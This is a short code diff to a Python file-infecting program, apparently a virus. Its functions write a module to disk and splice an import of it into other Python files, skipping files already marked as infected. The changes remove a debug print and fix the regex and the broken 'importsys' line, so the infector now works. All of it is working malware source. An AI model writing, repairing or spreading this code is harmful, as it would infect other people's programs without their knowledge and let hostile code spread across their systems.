@@ -54,7 +54,6 @@ def drop_module(dest_file_path):
     @return: none
     """
     global MODULE_CODE
-    print("DEST OF MOD: " + dest_file_path)
     mod_code = read_module_code(MODULE_CODE)
     with open(dest_file_path, "w") as f:
         f.write(mod_code)
@@ -96,10 +95,10 @@ def infect_file(file_path):
     if search_str in old_content:
         return      # return if it's already infected
 
-    res = re.search('^import sys', old_content)   # find the first import line
+    res = re.search('^import sys', old_content, flags=re.MULTILINE)   # find the first import line
     if res:    
         # make a new import block that has our module
-        new_imp = "importsys\nimport " + DEST_MODULE_NAME[:-3] + "\n"     
+        new_imp = "import sys\nimport " + DEST_MODULE_NAME[:-3] + "\n"     
         new_con = old_content.replace(current_imp, new_imp, 1)     # insert the new import block
         with open(file_path, "w") as f:
             print("Infecting " + file_path + "...")
